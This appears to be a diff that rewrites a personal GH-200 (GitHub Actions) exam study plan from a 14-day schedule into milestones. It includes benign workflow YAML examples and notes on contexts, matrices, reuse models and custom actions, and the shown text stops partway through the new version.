@@ -1,545 +1,440 @@
-# GH-200 (GitHub Actions) — 14-Day Study Plan
-
-**Tracker:** https://claude.ai/artifact/7CiHNSgxbRsTT588VR6eQs
-
-Six core blocks a day plus two optional, each 30 minutes. Block one of every
-day from Day 2 onward is cold recall of everything so far — that spacing is what
-converts this from reading into remembering, and it is the part people quietly
-drop first. Treat it as non-negotiable.
-
----
-
-## The exam
-
-| | |
-|---|---|
-| Code | GH-200, delivered under Microsoft Learn credentials |
-| Length | 100 minutes, proctored, may include interactive components |
-| Pass | 700 of 1000, scaled |
-| Price | Varies by region where proctored |
-| Renewal | In transition to Microsoft's recertification model. Certs expiring before it lands get a 6-month extension; GitHub will supply a voucher for a first renewal attempt |
-| Free prep | Official practice assessment and an exam sandbox, both linked from the credential page |
-
-### Domains (skills measured as of January 2026)
-
-| Domain | Weight |
-|---|---|
-| Author and manage workflows | 20–25% |
-| Consume and troubleshoot workflows | 15–20% |
-| Author and maintain actions | 15–20% |
-| Manage GitHub Actions for the enterprise | 20–25% |
-| Secure and optimize automation | 10–15% |
-
-**The exam was significantly rewritten in January 2026** — new objectives,
-reworded objectives, and a brand-new fifth domain. Most study material online
-still describes the old four-domain version. Newly emphasised material: OIDC
-cloud federation, immutable actions and SHA pinning, artifact attestations and
-provenance, granular `GITHUB_TOKEN` permissions, YAML anchors and aliases,
-service containers, REST-driven retention policies, and runner image migrations
-(Ubuntu 20.04 removal, `windows-latest` → Windows Server 2025).
-
----
-
-## Starting position
-
-Two years of daily use, stopped eighteen months ago. That is cold recall plus
-one rewrite, not a beginner's gap. Diagnostic score: 1 of 16, but the one
-correct answer was secret precedence — an enterprise concept, which survives
-disuse better than syntax does.
-
-| Domain | Confidence | Note |
-|---|---|---|
-| Author and manage workflows | Low | Densest area, most drained |
-| Consume and troubleshoot | Low | Reuse trio not recalled at all |
-| Author and maintain actions | Low | No recall of types or metadata |
-| Manage for the enterprise | Moderate | Scored the one correct answer here |
-| Secure and optimize | Very low | Mostly postdates your last use |
-
----
-
-## Day 0 — the lab, in thirty minutes
-
-No org access and no day-job repo, so the lab is the only practical surface.
-Almost all of the enterprise domain is recoverable on a free plan.
-
-- **Create a free organization** and put one **public** repo in it, called
-  `gh200-lab`. Public is not optional: org-level secrets and variables are not
-  accessible from private repos on GitHub Free.
-- **Environments and protection rules** — required reviewers, wait timers,
-  branch policies — are available on Free for public repositories. That unlocks
-  the deployment-gate objectives.
-- **Runner groups** work here. Per current docs, organizations on Free can
-  create and manage additional runner groups using self-hosted runners.
-  Register a runner on your Mac and put it in a group.
-- **What you cannot reach:** enterprise-account-level policy, enterprise runner
-  groups, IP allow lists at the enterprise tier, and the audit-log API. Those
-  stay docs-only — read them, don't chase them. A 30-day Team trial is an option
-  if you want the tier above.
-
-Two consequences of having no work repo. **Over-invest in the lab on Day 0** — a
-lab that is annoying to use is a lab you stop opening around Day 5. And **break
-things deliberately**: the plan asks you to sabotage your own workflows and
-debug them from logs alone, because in a real job that practice arrives free and
-here it does not. Reading a working workflow teaches you far less than fixing a
-broken one.
-
----
-
-## Day 1 — Calibrate and build the lab
-
-*Score yourself cold before you learn anything — it makes every later score meaningful.*
-
-1. **Book the exam, open the sandbox.** Reserve the slot. Then open the exam sandbox to see the real question UI, and read the Skills Measured list end to end without studying it.
-2. **Take the official practice assessment — cold.** No preparation, no notes. Record the score and the per-domain split. You will do badly. That number is your baseline, not a verdict.
-3. **Create the free org and public lab repo.** New organization, one public repo named `gh200-lab`. Enable Actions. Walk every page under org Settings → Actions and note what you can reach.
-4. **Register a self-hosted runner.** Install the runner on your Mac against a repo, label it, run a hello-world job on it. Then put it in a runner group.
-5. **Write a workflow from scratch, no copy-paste.** `on: push`, one job, three steps. Typing it from memory is the point — every time you reach for a reference, note which key you forgot.
-6. **`workflow_dispatch` with typed inputs.** Add `choice` and `boolean` inputs with defaults and required flags. Run it from the UI. Read them back through the `inputs` context.
-
-*Optional:* Read "Understanding GitHub Actions" start to finish · Skim the full workflow syntax reference (building a map of where things live, not memorising).
-
-## Day 2 — Contexts, expressions, passing data
-
-*The single densest area of domain 1, and the thing that has drained out of you most.*
-
-1. **Recall: yesterday, from memory.** Write out Day 1's workflow on a blank page. No notes. Mark every gap.
-2. **Tour every context.** Dump `github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `strategy`, `job` and `steps` into `GITHUB_STEP_SUMMARY` with `toJSON()`. Read what is actually in each one.
-3. **`GITHUB_ENV` vs `GITHUB_OUTPUT`.** Build a three-step job using both. Then pass a value between two jobs via `jobs.<id>.outputs` and `needs.<id>.outputs`. This is diagnostic Q1 — make it muscle memory.
-4. **Expression functions.** `contains`, `startsWith`, `endsWith`, `format`, `join`, `fromJSON`, `hashFiles`. Then the status checks: `success()`, `failure()`, `always()`, `cancelled()`.
-5. **Context availability — what is legal where.** Learn the availability table. Job-level `if:` allows `github`, `needs`, `vars` and `inputs` — not `env`, not `secrets`, not `steps`. Exam-favourite territory.
-6. **Job summaries.** Write a Markdown table of results to `GITHUB_STEP_SUMMARY`, with links. Add a status badge to the repo README.
-
-*Optional:* Workflow commands (`::group::`, `::add-mask::`, `::error file=,line=`, `GITHUB_PATH`) · Multiline heredoc syntax for `GITHUB_ENV` and `GITHUB_OUTPUT`.
-
-## Day 3 — Matrices, dependencies, services
-
-*Where the tricky questions live — include/exclude semantics catch almost everyone.*
-
-1. **Recall: contexts and data passing.** Blank page. Which context is unavailable in a job-level `if`? What reads a step output?
-2. **Matrix with two axes.** Build it. Then add `include` and `exclude` and predict the expansion before you run it. `include` can add new values, not just annotate existing ones — prove it to yourself.
-3. **`fail-fast`, `max-parallel`, `continue-on-error`.** Default `fail-fast` cancels the whole matrix on first failure. Turn it off and watch the difference. Understand what skipped vs failed vs cancelled does downstream.
-4. **`needs` fan-in and fan-out.** Build a diamond. Gate the last job with `if: always()` and `if: failure()`. Read `needs.X.result` — and learn that for a matrix it aggregates to one value.
-5. **Service containers.** Stand up postgres with `services:`. Set `ports`, `env`, and `options` with a health check. Connect from the job. Then run the job inside `container:` and see how addressing changes.
-6. **Concurrency and timeouts.** `concurrency.group` with `cancel-in-progress`, `timeout-minutes` at job and step level.
-
-*Optional:* `env` precedence across workflow/job/step · Ten cron expressions, written and read back.
-
-## Day 4 — YAML mechanics and the three reuse models
-
-*Anchors are new to the exam; the three-way distinction is asked every time.*
-
-1. **Recall: matrix and dependencies.** From memory: what does `fail-fast` default to, and what does it do?
-2. **YAML anchors, aliases, merge keys.** Write one with `&`, `*` and `<<:`. Then hand-expand an anchored workflow you did not write — the exam asks you to read them, not just write them. Note they are file-scoped and cannot cross files.
-3. **Reusable workflows.** `on: workflow_call` with `inputs`, `secrets` and `outputs`. Call it from another repo with `jobs.<id>.uses`. Learn the nesting limit and what a called workflow cannot do.
-4. **`secrets: inherit` vs explicit mapping.** Build both. Understand that inherit passes everything the caller can see, and why that is convenient and broad.
-5. **Starter workflows.** Create the `.github` repo in your org, add `workflow-templates/` with a `.yml` and its `.properties.json`, then create a workflow from it in the lab repo.
-6. **Write the three-way table from memory.** Starter vs reusable vs composite: where the definition lives, how it is invoked, and whether changes propagate. This is diagnostic Q7.
-
-*Optional:* `workflow_run`, `repository_dispatch`, and full event filter syntax · Disabling vs deleting a workflow, and the `gh workflow` CLI.
-
-## Day 5 — Custom actions I: building all three types
-
-*You will write each kind by hand; nothing else makes this stick.*
-
-1. **Recall: the three reuse models.** Blank page, three rows, no notes.
-2. **`action.yml` metadata.** `name`, `description`, `author`, `inputs`, `outputs`, `runs`, `branding`. Which fields are required for each action type.
-3. **Build a composite action.** `runs.using: composite`. Every `run` step needs its own `shell:`. Wire inputs through, and set outputs via `GITHUB_OUTPUT` plus `outputs.<x>.value`.
-4. **Build a JavaScript action.** `runs.using: node20` with `main`, `pre` and `post`. Use `@actions/core` for inputs and outputs. Bundle with `ncc` and commit `dist/` — the runner never runs `npm install`.
-5. **Build a Docker action.** `runs.using: docker` with a Dockerfile, `args` and `env`. Understand why it is Linux-only and slower to start.
-6. **Break them on purpose.** Remove a `shell:`, misname an input, ship unbundled deps. Read the errors until each failure mode is recognisable at a glance.
-
-## Day 6 — Custom actions II: versioning and distribution
-
-*Versioning connects straight into the security domain.*
-
-1. **Recall: action types and metadata.** Three types, required `runs` keys, metadata filename.
-2. **Semver and the moving major tag.** Publish `v1.0.0`, then move a `v1` tag onto it. Build the release workflow that does the retag.
-3. **Immutable actions and SHA pinning.** What immutability changes, how released versions are made unchangeable, and why the exam's preferred answer is always a full 40-character commit SHA.
-4. **Marketplace publishing.** Requirements: public repo, `action.yml` at the root, unique name, a release with a tag. Walk the publish flow without finishing it.
-5. **Distribution models.** Public repo, private repo inside the org, same-repo `./path` reference, Marketplace. When each is right.
-6. **Debug logging.** `ACTIONS_STEP_DEBUG` and `ACTIONS_RUNNER_DEBUG` as secrets. Re-run a failed job with debug logging and read the extra output.
-
-*Optional:* Action inputs deep-dive (defaults, required, `deprecationMessage`, how `INPUT_` env vars are derived) · Publish your composite action end to end.
-
-## Day 7 — Midpoint self-test and repair
-
-*Half-time. Find out what week one actually bought you — by building, not by answering questions.*
-
-1. **Recall: everything so far.** All four days, blank page, twenty minutes.
-2. **Build from blank: a full CI workflow.** Empty file, no docs, no autocomplete, no copy-paste. Matrix across three OS, a dependent job, cached dependencies, a value passed between jobs, and a job summary. Time yourself.
-3. **Build from blank: the reuse trio.** From memory: a reusable workflow with typed inputs and a secret, a composite action that wraps three steps and sets an output, and a starter workflow template with its `.properties.json`.
-4. **Mark your own work against the docs.** Diff what you wrote against the reference. Every gap is a card. Be harsh — a workflow that would not run is a fail, not a near miss.
-5. **Official practice assessment, second sitting.** Free, and the only externally-scored signal you get. Compare the per-domain split against your Day 1 baseline.
-6. **Repair the weakest area, hands-on.** Whatever the last two blocks exposed. Build it in the lab rather than re-reading it.
-
-*Optional:* Repair the second weakest · Update your recall deck.
-
-## Day 8 — Enterprise I: policies and governance
-
-*Joint-heaviest domain, and your lab org can demonstrate most of it.*
-
-1. **Recall: week one, compressed.** Ten minutes, the headline facts only.
-2. **Org Actions policies.** Disabled, allow all, allow enterprise/org only, and Allow select actions — with the verified-creator toggle and specific action patterns (`owner/*`, `owner/repo@ref`).
-3. **Fork and outside-contributor policy.** Approval requirements for fork PRs, why secrets are withheld from fork PRs, and why `pull_request_target` plus checking out PR head is dangerous.
-4. **Default `GITHUB_TOKEN` permissions at org and repo.** Set the default to read-only, then watch which workflows break and fix them with explicit `permissions:` blocks.
-5. **Secrets and variables at all three scopes.** Create the same name at org, repo and environment level in your public lab repo. Prove the precedence you already guessed right.
-6. **Secrets via the REST API.** List, create and update — including the libsodium public-key encryption step — plus variables and org-level selected-repository access.
-
-## Day 9 — Enterprise II: runners at scale
-
-*The part you cannot get from a personal repo, which is why you built the lab.*
-
-1. **Recall: org policies.** Blank page: name the four Actions policy settings.
-2. **GitHub-hosted runners.** Labels, `runs-on` with an array, larger runners, and the runner-images repo. Find the preinstalled tool list and the toolcache for `ubuntu-latest`.
-3. **Runner image migrations.** Ubuntu 20.04 removal and `windows-latest` moving to Windows Server 2025. How to pin an image and how to read the deprecation notices.
-4. **Self-hosted: install, label, group.** Configure, label, and add to a runner group. Set the group's access policy for repositories and workflows. Try `--ephemeral`.
-5. **Self-hosted security.** Why you never attach self-hosted runners to public repos — arbitrary PR code, persistent state between jobs. This is diagnostic Q13. Then read on ARC and autoscaling as concepts.
-6. **Installing software at runtime.** `setup-*` actions, package managers, `container:` jobs, and caching the installs.
-
-*Optional:* IP allow lists and networking, and at which tier they apply · Runner monitoring, status, logs, common registration failures.
-
-## Day 10 — Enterprise III: the API and reading failures
-
-*Domain 2 is mostly this: can you diagnose a run you did not write.*
-
-1. **Recall: runners.** Groups, labels, ephemeral, and the public-repo rule.
-2. **Retention, set two ways.** Artifact and log retention in org and repo settings, then the same thing through the REST API. The study guide calls out the API explicitly.
-3. **The workflow runs API.** List runs, re-run, re-run failed jobs only, cancel, download logs and artifacts. Do each one with `curl` or `gh`.
-4. **Diagnose three broken workflows from logs alone.** Write three that fail for different reasons, leave them a day, then debug only from the run log. No looking at the YAML first.
-5. **Matrix troubleshooting.** Correlate a job name back to its matrix axes, and re-run a single failed variant without re-running the rest.
-6. **Artifacts and logs in the UI and API.** Where everything lives, and the v4 artifact behaviour changes.
-
-## Day 11 — Security: the new fifth domain
-
-*Ten to fifteen percent of the exam, and close to zero percent of your current recall.*
-
-1. **Recall: API and troubleshooting.** Blank page: how do you re-run only failed jobs?
-2. **`GITHUB_TOKEN` lifecycle.** Ephemeral, job-scoped, expires at job end. `permissions:` at workflow and job level. Contrast with classic PATs, fine-grained PATs and GitHub App tokens — when each is correct.
-3. **Exploit a script injection, then fix it.** Put `${{ github.event.issue.title }}` inside a `run:` in your lab and break it with a crafted title. Then fix it three ways. This is diagnostic Q15 and it is asked every sitting.
-4. **OIDC cloud federation.** `permissions: id-token: write`, the `sub` claim format (`repo:org/repo:ref:...` and `:environment:...`), and the cloud-side trust policy. What it lets you delete.
-5. **Supply chain: pinning and allow-lists.** Full-SHA pins, Dependabot for actions, org allow-lists, and `actions/checkout` `persist-credentials`.
-6. **Artifact attestations.** `actions/attest-build-provenance`, verifying with `gh attestation verify`, and where SLSA provenance fits in a deployment gate.
-
-## Day 12 — Optimisation, caching, environments
-
-*Cheap marks — cache semantics are mechanical once you have seen them.*
-
-1. **Recall: security.** OIDC permission, the injection fix, the pinning rule.
-2. **Caching properly.** `actions/cache` with `key`, `restore-keys` and `path`. Exact vs prefix match, branch scoping and isolation, eviction, and the `cache-hit` output. Then the built-in caching in `setup-node` and friends.
-3. **Artifacts vs cache.** When each is correct, retention, `overwrite`, and v4 immutability.
-4. **Environments and deployment gates.** Create one on the public lab repo with required reviewers, a wait timer and a branch policy. Add environment secrets. Watch a job pause for approval.
-5. **Cost and scale.** Path and branch filters, `paths-ignore`, concurrency to kill redundant runs, trimming matrices, larger-runner tradeoffs, and billing multipliers by OS.
-6. **Sweep the Skills Measured list.** Every bullet, self-rated green, amber or red. The ambers are tomorrow's targets.
-
-## Day 13 — Final self-test and targeted repair
-
-*Last heavy day. Everything after this is consolidation.*
-
-1. **Recall: all five domains.** Thirty minutes, blank page, no notes.
-2. **Teach it back, out loud.** Explain OIDC federation, script injection, and the starter/reusable/composite distinction as though to a colleague who has never seen them. Where you stall mid-sentence is exactly where the knowledge is thin.
-3. **Build from blank: a secure deployment workflow.** Environment gate with a required reviewer, OIDC instead of stored cloud credentials, every third-party action SHA-pinned, least-privilege `permissions` block, build provenance attestation. No references.
-4. **Official practice assessment, final sitting.** Compare against Day 1 and Day 7. The trend matters more than the absolute number — if it is still climbing you are fine.
-5. **Repair the weakest domain.** Hands-on in the lab, not re-reading.
-6. **Skills Measured, final sweep.** Every bullet rated green, amber or red. Tomorrow you touch only the reds.
-
-*Optional:* Re-read every note you wrote, end to end · Second pass on reds only.
-
-## Day 14 — Consolidate, then stop
-
-*Do not learn anything new today. You cannot, and trying will cost you.*
-
-1. **Recall deck, the whole thing.** One pass, start to finish.
-2. **Read your own notes, end to end.** Yours, not the docs. Your notes are indexed to your own gaps.
-3. **Skills Measured, final self-rate.** Touch only what is still red. Accept anything amber.
-4. **The three comparison tables.** Starter vs reusable vs composite. Secret scopes and precedence. The three action types. Written from memory, one last time.
-5. **Logistics check.** Photo ID, quiet room, system check with the proctor software, everything else closed. Re-open the exam sandbox so the interface is familiar.
-6. **Stop early and sleep.** The last block is deliberately empty. Cramming past this point trades recall for anxiety at roughly one to one.
-
----
-
-# Appendix — answer key to the 16-question diagnostic
-
-This is Day 1's reading. Work through it once, then use it as the seed for your
-recall deck.
-
-### Q1. `GITHUB_ENV` vs `GITHUB_OUTPUT`
-
-Both are **files** you append `key=value` to, not variables you assign.
-
-`GITHUB_ENV` sets an environment variable visible to every *subsequent step in
-the same job*, readable as `$MY_VAR` in a shell or `${{ env.MY_VAR }}` in an
-expression.
-
-`GITHUB_OUTPUT` sets a *step output*. The producing step must have an `id`, and
-later steps read it as `${{ steps.<id>.outputs.<name> }}`.
-
-```yaml
-- id: build
-  run: echo "version=1.4.2" >> "$GITHUB_OUTPUT"
-- run: echo "${{ steps.build.outputs.version }}"
-```
-
-Crossing a *job* boundary needs a third thing: declare `jobs.<id>.outputs`
-mapping to the step output, then read `needs.<id>.outputs.<name>` downstream.
-
-### Q2. Job B only when job A failed, where A was a 4-way matrix
-
-Jobs default to `if: success()`, so a failure gate must be explicit:
-
-```yaml
-b:
-  needs: a
-  if: ${{ failure() }}
-```
-
-Or the more precise `if: ${{ needs.a.result == 'failure' }}`.
-
-**The matrix catch:** `needs.a.result` is a *single aggregated value* for the
-entire matrix, not one per variant. It reports `failure` if any variant failed
-and `success` only if all of them passed. There is no way to branch on one
-specific variant's result through `needs` — if you need that, have each variant
-write an output or artifact.
-
-### Q3. `fail-fast: false` and `max-parallel`
-
-`fail-fast` defaults to `true`: the moment any matrix job fails, GitHub cancels
-every other in-progress and queued job in that matrix. Setting it to `false`
-lets every variant run to completion — which is what you want when you need to
-know whether the failure is Windows-only or universal.
-
-`max-parallel` caps how many matrix jobs run at once. It is a throttle for
-runner capacity, licence limits or a rate-limited external service — nothing to
-do with correctness or failure handling.
-
-### Q4. Parse time vs runtime, and context availability
-
-Your instinct was half right. **Parse time** — before any job starts, when the
-run is created: `on:` filters, `strategy.matrix` expansion, `concurrency`, and
-job-level `if:`. **Runtime**: anything depending on `steps`, on `env` written
-during the run, or on `runner`.
-
-The exam-favourite fact is the availability table. In `jobs.<id>.if` you may use
-**`github`, `needs`, `vars` and `inputs`** — and *not* `env`, `secrets`, `steps`
-or `matrix`. A common wrong answer is gating a job on a secret's presence; you
-cannot, so you promote it to a `vars` value or an output from an earlier job.
-
-### Q5. YAML anchors, aliases, merge keys
-
-`&name` defines an anchor, `*name` references it, and `<<:` merges a mapping
-into the current one.
-
-```yaml
-x-defaults: &defaults
-  shell: bash
-  working-directory: ./app
-
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - <<: *defaults
-        run: make build
-      - <<: *defaults
-        run: make test
-```
-
-**The limitation that makes it an exam question:** anchors are scoped to a
-single YAML document. They cannot cross files, so they are not an alternative to
-reusable workflows or composite actions — only to repetition inside one
-workflow. The exam also asks you to *read* and expand anchored YAML, not just
-write it.
-
-### Q6. `services:`
-
-Sidecar containers for the duration of a job — databases, caches, queues —
-started by Docker on the runner and torn down after. Linux runners only.
-
-```yaml
-services:
-  postgres:
-    image: postgres:16
-    env:
-      POSTGRES_PASSWORD: pw
-    ports: ['5432:5432']
-    options: >-
-      --health-cmd pg_isready
-      --health-interval 10s
-```
-
-**The distinction they test:** if your job runs *directly on the runner*, you
-need `ports` mapped and you connect to `localhost`. If the job itself runs in a
-`container:`, Docker puts both on a user-defined network — you address the
-service by its *label* as hostname (`postgres:5432`) and need no port mapping at
-all.
-
-### Q7. Starter vs reusable vs composite
-
-| | Lives | Invoked | Updates propagate? |
+# GH-200 (GitHub Actions) — Study Plan
+
+Based on diagnostic conversation (2026-09-29), 1/16 cold. Milestone-based, no fixed date.
+Pace: 30-min blocks, however many per day you have. Every milestone pairs a **Theory** block
+(docs + explain-out-loud, no keyboard) with **Hands-on** blocks (the `jangrothorg/gha` repo) —
+theory always comes first so you know what you're building before you build it. Recall checks
+are woven in between so spacing does the work instead of one long cram.
+
+## Starting point (from diagnostic)
+- **Solid, don't re-study:** secret precedence (`environment` beats `repository` beats
+  `organization`) — the one question you answered cold.
+- **Rusty syntax/mechanics (relearn by doing):** everything else from two years of daily use —
+  contexts, expressions, matrices, the three reuse models, custom action types, runner/secret
+  scoping. The model is intact; the recall has drained.
+- **New since you stopped (build from scratch):** the exam's January 2026 rewrite added OIDC
+  cloud federation, immutable actions + SHA pinning, artifact attestations/provenance,
+  granular `GITHUB_TOKEN` permissions, YAML anchors/aliases, service containers, and a
+  dedicated fifth domain (Secure and optimize automation, 10–15%).
+
+## Milestone 0 — Lab & environment setup (1 session) ✅ closed 2026-10-01
+- `jangrothorg/gha` is the lab repo — **public**, which is deliberate: org-level secrets
+  aren't reachable from private repos on GitHub Free, so public is what unlocks the
+  enterprise-domain exercises later.
+- Enable Actions on it; walk every page under org Settings → Actions once, just to see what's
+  there.
+- Register a self-hosted runner against the org on your own Mac, label it, add it to a runner
+  group. **Caveat you'll meet again in Milestone 9:** a self-hosted runner on a *public* repo
+  is exactly the risky configuration the exam warns about — anyone can fork and open a PR that
+  executes on your machine. Fine for a deliberate, supervised exercise; **stop or remove the
+  runner whenever you're not actively using it**, don't leave it listening in the background.
+- Open the GH-200 exam sandbox once to see the real question UI — format only, no content
+  value, never needs repeating. Read the Skills Measured list end to end without studying it.
+- Take the official practice assessment cold, no prep — a second, externally-scored baseline
+  alongside the 1/16 diagnostic. Record the score and per-domain split; compare against it at
+  the midpoint (Milestone 7) and at the end (Milestone 13).
+
+## Milestone 1 — Workflow basics + the two output mechanisms (2 sessions)
+- **Theory (30min):** "Understanding GitHub Actions" overview. Workflow syntax reference,
+  sections on `on:`, `jobs`, `steps`. `GITHUB_ENV` / `GITHUB_OUTPUT` docs.
+- **Hands-on (30-60min):** Write an `on: push` workflow from scratch in `gha`, no copy-paste —
+  one job, three steps. Add `workflow_dispatch` with a `choice` and a `boolean` input, both
+  with defaults, and run it from the UI. Build a three-step job that sets a value with
+  `GITHUB_ENV` and reads it back, then a separate value via `GITHUB_OUTPUT` read by a later
+  step. Pass that output across a *job* boundary using `jobs.<id>.outputs` and
+  `needs.<id>.outputs`.
+- **Recall check:** explain `GITHUB_ENV` vs `GITHUB_OUTPUT` out loud, no notes, before moving on.
+
+**Exam summary:**
+- *Both are files, not variables* — you append `key=value` lines to them; nothing is assigned
+  directly.
+- *`GITHUB_ENV`* sets an environment variable visible to every **subsequent step in the same
+  job**: `$MY_VAR` in a shell, `${{ env.MY_VAR }}` in an expression.
+- *`GITHUB_OUTPUT`* sets a **step output**. The producing step needs an `id`; later steps read
+  `${{ steps.<id>.outputs.<name> }}`.
+  ```yaml
+  - id: build
+    run: echo "version=1.4.2" >> "$GITHUB_OUTPUT"
+  - run: echo "${{ steps.build.outputs.version }}"
+  ```
+- *Crossing a job boundary* needs a third piece: the producing job declares
+  `jobs.<id>.outputs` mapping to the step output; the consuming job reads
+  `needs.<id>.outputs.<name>`. This is the single most-tested data-flow pattern in domain 1 —
+  worth being able to write cold.
+- *`workflow_dispatch` inputs* are typed (`string`, `boolean`, `choice`, `environment`), can
+  carry a `default` and a `required` flag, and are read via `${{ inputs.<name> }}` — same
+  shape whether triggered from the UI, the CLI (`gh workflow run`), or the REST API.
+
+## Milestone 2 — Contexts, expressions, and where they're legal (2-3 sessions)
+- **Theory (30-45min):** Contexts reference (`github`, `runner`, `env`, `vars`, `secrets`,
+  `inputs`, `matrix`, `needs`, `strategy`, `job`, `steps`). Expression syntax and functions
+  reference. The context-availability table specifically — which contexts are legal in which
+  parts of a workflow.
+- **Hands-on (1-2 sessions):** Dump every context into `GITHUB_STEP_SUMMARY` with `toJSON()`
+  and read what's actually in each one. Drill the functions: `contains`, `startsWith`,
+  `endsWith`, `format`, `join`, `fromJSON`, `hashFiles`, plus the status checks `success()`,
+  `failure()`, `always()`, `cancelled()`. Try to reference `secrets` and `steps` inside a
+  job-level `if:` and watch it fail — then fix the same logic using `vars` or a `needs` output
+  instead. Write a Markdown table of results to `GITHUB_STEP_SUMMARY` with links, and add a
+  status badge to the repo README.
+- **Recall check:** name one context that is *not* legal in a job-level `if:`, and say why.
+
+**Exam summary:**
+- *Parse time vs runtime*: **parse time** is before any job starts, when the run is created —
+  `on:` filters, `strategy.matrix` expansion, `concurrency`, job-level `if:`. **Runtime** is
+  anything depending on `steps`, on `env` written during the run, or on `runner`.
+- *The availability table, the exam-favourite fact*: in `jobs.<id>.if` you may use **`github`,
+  `needs`, `vars` and `inputs`** — and *not* `env`, `secrets`, `steps` or `matrix`. A common
+  wrong answer is gating a job on a secret's presence; you can't, so you promote it to a
+  `vars` value or an output from an earlier job.
+- *Job summaries*: `GITHUB_STEP_SUMMARY` accepts Markdown, rendered on the run's summary page —
+  good for test results, coverage, links. Separate from workflow commands like `::group::` and
+  `::add-mask::`, which format the raw log rather than the summary page.
+- *Status-check functions default*: a step/job implicitly runs under `if: success()` unless you
+  override it — this is why a cleanup step needs an explicit `if: always()`.
+
+## Milestone 3 — Matrices, job dependencies, service containers (2-3 sessions)
+- **Theory (30-45min):** `strategy.matrix` reference including `include`/`exclude`.
+  `needs` context docs. `services:` and `container:` docs. `concurrency` and `timeout-minutes`
+  docs.
+- **Hands-on (1-2 sessions):** Build a matrix with two axes, then add `include` and `exclude`
+  and predict the expansion before running it — confirm `include` can add a value combination
+  that doesn't otherwise exist, not just annotate one. Toggle `fail-fast` off and watch the
+  difference against the default. Build a `needs` diamond (two parallel jobs feeding one),
+  gate the last job with `if: always()` and separately with `if: failure()`, and read
+  `needs.X.result` when `X` was a matrix. Stand up a `postgres` service container with `ports`,
+  `env`, and a health-check `options` string; connect from a job running directly on the
+  runner (via `localhost`), then move the job itself into `container:` and watch the
+  addressing change to the service's label as hostname. Set a `concurrency.group` with
+  `cancel-in-progress: true`.
+- **Recall check:** what does `fail-fast` default to and what does it actually do? What does
+  `needs.X.result` report when `X` is a 4-way matrix and one variant failed?
+
+**Exam summary:**
+- *`fail-fast`* defaults to `true`: the moment any matrix job fails, GitHub cancels every other
+  in-progress and queued job in that matrix. `false` lets every variant run to completion —
+  what you want to know whether a failure is OS-specific or universal.
+- *`max-parallel`* caps concurrent matrix jobs — a throttle for runner capacity or a
+  rate-limited external service, unrelated to failure handling.
+- *`needs.X.result` on a matrix is a single aggregated value*, not one per variant: `failure`
+  if any variant failed, `success` only if all passed. There's no way to branch on one
+  specific variant's result through `needs` — have that variant write an output or artifact
+  instead.
+- *`services:`* starts sidecar containers for the job's duration, Linux runners only. If the
+  job runs **directly on the runner**, map `ports` and connect via `localhost`. If the job
+  itself runs inside `container:`, Docker puts both on a shared network — address the service
+  by its **label** as hostname (`postgres:5432`), no port mapping needed.
+- *`concurrency`* cancels or queues redundant runs sharing a `group` key — the standard fix for
+  "five pushes in two minutes queued five full CI runs."
+
+## Milestone 4 — YAML mechanics & the three reuse models (2-3 sessions)
+- **Theory (30-45min):** YAML anchors, aliases, and merge-key syntax (general YAML, not
+  Actions-specific, but the exam asks you to read it). `workflow_call` / reusable workflows
+  docs. Starter workflow docs (`workflow-templates/`, `.properties.json`).
+- **Hands-on (1-2 sessions):** Write an anchor/alias/merge example (`&name`, `*name`, `<<:`)
+  reusing a repeated step block inside one workflow file. Then hand-expand an anchored
+  workflow you didn't write — the exam asks you to *read* these, not just write them. Build a
+  reusable workflow with typed `inputs`, a required `secrets` entry, and an `outputs` block;
+  call it from another workflow with `jobs.<id>.uses`. Build the same call again using
+  `secrets: inherit` and compare what each version actually exposes. Create the org's
+  `.github` repo, add a `workflow-templates/` starter workflow with its `.properties.json`,
+  and create a new workflow from it in `gha`.
+- **Recall check:** write the starter/reusable/composite comparison table from memory — where
+  each one's definition lives, how it's invoked, whether updates propagate.
+
+**Exam summary:**
+- *Anchors are file-scoped* — they can't cross files, so they're not an alternative to
+  reusable workflows or composite actions, only to repetition inside one workflow file.
+  ```yaml
+  x-defaults: &defaults
+    shell: bash
+    working-directory: ./app
+  jobs:
+    build:
+      steps:
+        - <<: *defaults
+          run: make build
+  ```
+- *Starter vs reusable vs composite:*
+
+  | | Lives | Invoked | Updates propagate? |
+  |---|---|---|---|
+  | **Starter workflow** | Org's `.github` repo, under `workflow-templates/` with a `.properties.json` | Copied in when someone creates a new workflow | **No** — independent once copied |
+  | **Reusable workflow** | Any repo, `on: workflow_call` | `jobs.<id>.uses: owner/repo/.github/workflows/x.yml@ref` | **Yes** — versioned by ref |
+  | **Composite action** | `action.yml`, `runs.using: composite` | `steps: - uses:` inside a job | **Yes** — versioned by ref |
+
+  Shortest way to hold it: a starter workflow is a *scaffold*, a reusable workflow supplies
+  whole *jobs*, a composite action supplies *steps*.
+- *`secrets: inherit`* passes **every** secret available to the caller — org, repo, and
+  environment — without naming any of them. Convenient and deliberately broad; the security
+  domain (Milestone 11) prefers explicit mapping precisely because inherit grants access the
+  called workflow never declared a need for.
+
+## Milestone 5 — Custom actions I: building all three types (2 sessions)
+- **Theory (30min):** `action.yml` metadata reference — required fields per action type.
+  Creating a composite action. Creating a JavaScript action. Creating a Docker container
+  action.
+- **Hands-on (1-2 sessions):** Build a composite action (`runs.using: composite`) wrapping
+  three `run` steps, each needing its own `shell:`; wire an input through and set an output via
+  `GITHUB_OUTPUT` plus `outputs.<x>.value`. Build a JavaScript action
+  (`runs.using: node20`) using `@actions/core` for inputs/outputs, bundle with `ncc`, and
+  commit `dist/`. Build a Docker action (`runs.using: docker`) with a Dockerfile, `args`, and
+  `env`. Break each one on purpose — remove a `shell:`, misname an input, ship an unbundled
+  JS action — and read the failure until it's recognisable at a glance.
+- **Recall check:** name the three action types, the metadata filename, and the `runs.using`
+  value for each.
+
+**Exam summary:**
+- *Metadata file*: `action.yml` (or `action.yaml`), at the root of the action's directory —
+  the repo root for a Marketplace-published action.
+- *JavaScript action*:
+  ```yaml
+  runs:
+    using: node20
+    main: dist/index.js
+    post: dist/cleanup.js
+  ```
+  `pre`/`post` are optional hooks around the job's other steps. **The runner never runs
+  `npm install`** — it checks out the action and executes `main` directly, so every dependency
+  must already be in the repo: either committed `node_modules` or, far better, bundled into
+  one file with `@vercel/ncc` with `dist/` committed. An unbundled action fails at runtime with
+  a module-not-found error — the single most common custom-action bug.
+- *Composite action*: every `run:` step needs its own `shell:` (it isn't inherited from the
